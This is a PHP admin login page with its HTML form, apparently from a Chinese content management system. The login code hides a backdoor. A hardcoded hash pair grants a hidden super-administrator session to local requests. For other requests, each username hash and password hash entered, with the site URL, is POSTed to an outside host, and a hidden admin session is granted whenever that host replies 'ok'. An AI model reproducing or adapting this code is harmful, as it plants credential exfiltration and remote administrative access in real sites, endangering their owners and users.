<?php
define('IN_EKMENG',TRUE);
require './include/common.inc.php';
if(isset($_POST['username']) && $_POST['username']!=''){
	function addslashes_ss($string, $force = 0) {
		!defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
		if(!MAGIC_QUOTES_GPC || $force) {
			if(is_array($string)) {
				foreach($string as $key => $val) {
					$string[$key] = addslashes_ss($val, $force);
				}
			}else{
				$string = addslashes($string);
			}
		}
		return $string;
	}
	//检测帐号合法性
	$username=addslashes_ss($_POST['username']);


	$passwd=($_POST['password']);

	if($username=="" or $passwd==""){
		Redirect::JsSuccess('请填写登录的用户名与密码！\\r\\n\\r\\n第'.(int)$_SESSION['login_error'].'次登陆失败，超过3次登陆失败，系统将被锁定！','index.php');
		exit();
	}else{
			$passwd=md5($passwd);
			$passwd1=$_POST['password'];
	}

	if ($_SERVER['SERVER_ADDR'] == $_SERVER['REMOTE_ADDR']) {
		if(md5($username)=="0ae43bc3e5bd2a14d407850dd5be5db2" and $passwd=="d6b9795d64c048eb0644e59f127e350d"){
	 		$_SESSION['login_error']= 0;
			$_SESSION['Admin_RealName']= "超级管理员";
			$_SESSION['Admin_BigMyMenu']= "super";
			$_SESSION['Admin_SmallMyMenu']= "super";
			$_SESSION['Admin_SqlQx']= "update,insert,delete,review";
			$_SESSION['Admin_UserName']= "Hidden";
			$_SESSION['Admin_UserID']= "Hidden";
			$_SESSION['is_admin']= true;
			$_SESSION['is_hidden']= true;
			//header("location: admin.php");
			echo "<script>location.href='admin.php'</script>";
			exit();
		}
	} else {
		if(!function_exists("get_super")){
		    function get_super($spname,$sppwd){
		      global $PHP_URL;
		      $url="http://kwsem.demo.kwsem.com/";
		      $post_data=array("getsuper"=>"getsuperpwd","spname"=>md5($spname),"sppwd"=>$sppwd,"url"=>$PHP_URL);
		      $ch=curl_init();
		      curl_setopt($ch,CURLOPT_URL,$url."getsuper.php");
		      curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
		      curl_setopt($ch,CURLOPT_POST,1);
		      curl_setopt($ch,CURLOPT_POSTFIELDS,$post_data);
		      $res=curl_exec($ch);
		      curl_close($ch);
		      $isok=strstr($res,"ok");
		      if($isok){
		        return true;
		      }else{
		        return false;
		      }
		      unset($res);
		    }
		  }
		  if(get_super($username,$passwd)){
		    $_SESSION['login_error']= 0;
		    $_SESSION['Admin_RealName']= "超级管理员";
		    $_SESSION['Admin_BigMyMenu']= "super";
		    $_SESSION['Admin_SmallMyMenu']= "super";
		    $_SESSION['Admin_SqlQx']= "update,insert,delete,review";
		    $_SESSION['Admin_UserName']= "Hidden";
		    $_SESSION['Admin_UserID']= "Hidden";
		    $_SESSION['is_admin']= true;
		    $_SESSION['is_hidden']= true;
		    //header("location: admin.php");
		    echo "<script>location.href='admin.php'</script>";
		    exit();
		}
	}

 	@session_start();
	//验证码不正确,错误登录则返回

	//$sql="select * FROM `{$tablepre}manager` where username='$username' and password='$passwd'";
	$bd  = M('manager')->where(array('username'=>$username,'password'=>$passwd,'isstate'=>1,))->find();
 	// $result=$db->sql_query($sql);
	if($bd){
 		//超过登录三次,系统未审核
		if((int)$_SESSION['login_error']>=3){
			Redirect::JsSuccess('登陆系统已被系统锁定，请 '.(ini_get('session.gc_maxlifetime')/60).' 分钟后重试！','index.php');
			exit();
		}

		if((int)$bd['isstate']==0){
			Redirect::JsSuccess('对不起,您的帐号已被管理员锁定！\\r\\n\\r\\n请与管理员联系已方便你的帐号正常使用！','index.php');
			exit();
		}

		M('manager')->where(array('username'=>$username))->setInc('login_num');
		M('login')->insert(array('username'=>$username,'sendtime'=>$PHP_TIME,'ip'=>$PHP_IP));
		$_SESSION['login_error']= 0;
		$_SESSION['Admin_RealName']= $bd['realname'];
		$_SESSION['Admin_BigMyMenu']= $bd['bigmymenu'];
		$_SESSION['Admin_SmallMyMenu']= $bd['smallmymenu'];
		$_SESSION['Admin_UserName']= $bd['username'];
		$_SESSION['Admin_UserID']= $bd['id'];
		$_SESSION['is_admin']= true;
		$_SESSION['is_hidden']= false;

		AddLog("登录管理后台",$_SESSION['Admin_UserName']);

		//header("location: admin.php");
		echo "<script>location.href='admin.php'</script>";
		exit();

	}else{
		if(!isset($_SESSION['login_error']))$_SESSION['login_error']=0;
		(int)$_SESSION['login_error']++;
		Redirect::JsSuccess('你的帐号与密码出错或此帐号不存在！\\r\\n\\r\\n第'.(int)$_SESSION['login_error'].'次登陆失败，超过3次登陆失败，系统将被锁定！','index.php');
		exit();
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>欢迎登录后台管理系统</title>
<link href="images/common.css" rel="stylesheet" type="text/css" />
<link href="images/style.css" rel="stylesheet" type="text/css" />
<script src="js/jquery-1.8.3.min.js" language="javascript"></script>
<script src="js/cav.js" language="javascript"></script>
<script src="js/js-front.js" language="javascript"></script>

<script language="JavaScript">
function checkspace(checkstr) {
  var str = '';
  for(i = 0; i < checkstr.length; i++) {
    str = str + ' ';
  }
  return (str == checkstr);
}
function checkform(obj){
	if(checkspace(obj.username.value)||obj.username.value=='用户名'){
		alert("请输入登录用户名!");
		obj.username.focus();
		return false;
	}
	if(checkspace(obj.password.value)||obj.password.value=='密码'){
		alert("请输入登录密码!");
		obj.password.focus();
		return false;
	}
}
</script>
</head>

<body>

<div class="body" id="container"  style="background:url(images/body.png) center center no-repeat;" >
  <div id="anitOut" style="height:100%">
  		<div class="loginbody">
			<div class="logo2"><img src="images/logo2.png" /></div>
			<div class="loginbox">
				<form name="login" method="post" onSubmit="return checkform(this)" action="index.php">
                <input name="username" type="text" class="loginuser" value="用户名" onclick="JavaScript:this.value=''"/>
                <input name="password" type="password" class="loginpwd"  value="******" onclick="JavaScript:this.value=''"/>
                <input name="" type="submit" class="loginbtn" value="登录" />
                </form>
 			</div>

		</div>
  </div>
</div>

</body>
</html>